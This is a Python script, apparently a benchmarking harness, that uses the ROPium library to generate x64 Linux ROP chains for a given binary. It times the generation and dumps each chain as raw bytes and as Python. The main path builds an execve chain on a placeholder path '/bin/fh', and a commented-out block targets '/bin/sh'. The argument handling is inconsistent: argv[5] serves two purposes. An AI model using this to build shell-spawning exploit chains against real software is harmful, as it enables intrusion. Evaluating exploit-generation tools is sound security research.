import sys
from ropium import *
from datetime import datetime 
from elftools.elf.elffile import ELFFile

binary = sys.argv[1]
ropchain = sys.argv[2]
script = sys.argv[3]
rwaddr = sys.argv[4]

check_regs = 0
if(len(sys.argv) >= 6):
    check_regs_set_func_addr = int(sys.argv[5])
if(len(sys.argv) >= 7):
    check_regs = int(sys.argv[6])


# from elftools.elf.elffile import ELFFile
def find_rw_section(binary, section_name=".got.plt"):
    with open(binary, "rb") as bin_data:
        elf = ELFFile(bin_data)
        sec = elf.get_section_by_name(section_name)
        if not sec:
            sec = elf.get_section_by_name(".data")
        addr = sec['sh_addr']
        return addr

def get_func_addr(binary, function_name):
    with open(binary, "rb") as bin_data:
        elf = ELFFile(bin_data)
        sec = elf.get_section_by_name(".symtab")
        if sec is None:
            sec = elf.get_section_by_name(".dynsym")
        symbols_list = sec.get_symbol_by_name(function_name)
        if symbols_list is None:
            print("{} not found".format(function_name))
            exit(1)
        symbol = symbols_list[0]
        addr = symbol.entry['st_value']
        print("{} addr: {}".format(function_name, hex(addr)))
        return addr

begin = datetime.now() 
rop = ROPium(ARCH.X64)
rop.abi = ABI.X64_SYSTEM_V
rop.os = OS.LINUX
if len(sys.argv) == 6:
    import binascii
    bad_chars = sys.argv[5]
    rop.bad_bytes = list(binascii.unhexlify(bad_chars))     # [0x00, 0x0a, 0x0b]
rop.load(binary)
# rop.load2(binary) # load2() is load() with builtin filter (add by eqqie)
anaylsis_end = datetime.now() 

if(check_regs != 0):
    set_values = [0x100001, 0x100002, 0x100003, 0x100004, 0x100005, 0x100006]
    call_paras_list = " " + hex(check_regs_set_func_addr) + "("
    for i in range(check_regs):
        call_paras_list += str(set_values[i]) + ", "
    call_paras_list = call_paras_list[:-2] + ")"
    # chain = rop.func_call(check_regs_set_func_addr, call_paras_list)

    chain = rop.compile(call_paras_list)
    if chain is None:
        print("ropium could not generate set_regs chain")
        chain_end=datetime.now() 

        sys.exit(1)

    chain_end=datetime.now() 
else:
    
    '''
    rw_address = find_rw_section(binary, section_name = '.data')
    sys_func_addr = get_func_addr(binary, 'sys')
    
    store_mem_chain = rop.compile('[{}] = "/bin/sh\x00"'.format(rw_address))
    if store_mem_chain is None:
        print("ropium could not generate store_mem chain")
        chain_end=datetime.now() 

        sys.exit(1)
        
    call_paras_list = " " + hex(sys_func_addr) + "("
        
    call_paras_list += str(rw_address) + ", "
    call_paras_list = call_paras_list[:-2] + ")"
    # chain = rop.func_call(check_regs_set_func_addr, call_paras_list)

    syscall_chain = rop.compile(call_paras_list)
    if syscall_chain is None:
        print("ropium could not generate syscall chain")
        chain_end=datetime.now() 
        sys.exit(1)
    '''
    store_mem_chain = rop.compile('[{}] = "/bin/fh\x00"'.format(rwaddr))
    if store_mem_chain is None:
        print("ropium could not generate store_mem chain")
        chain_end=datetime.now() 

        sys.exit(1)
    syscall_chain = rop.compile('sys_execve({}, 0, 0)'.format(rwaddr))
    if syscall_chain is None:
        print("ropium could not generate syscall chain")
        chain_end=datetime.now() 
        sys.exit(1)

    chain = store_mem_chain + syscall_chain
    chain_end=datetime.now() 

with open(ropchain, 'wb') as f:
    f.write(chain.dump('raw'))

with open(script, 'w') as f:
    f.write(chain.dump('python'))

